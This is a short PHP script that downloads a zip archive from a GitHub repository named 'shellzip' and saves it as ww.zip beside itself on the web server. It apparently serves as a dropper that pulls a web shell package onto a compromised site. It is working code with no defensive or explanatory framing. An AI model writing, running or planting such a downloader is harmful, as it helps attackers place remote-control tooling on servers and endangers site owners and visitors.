<?php
$file_url = 'https://raw.githubusercontent.com/Zeddgansz/shellzip/refs/heads/main/ww.zip';

$save_to = __DIR__ . '/ww.zip'; // 


$file_content = file_get_contents($file_url);

if ($file_content !== false) {
    file_put_contents($save_to, $file_content);
    echo "File has been downloaded and saved as $save_to";
} else {
    echo "Failed to download file.";
}
?>
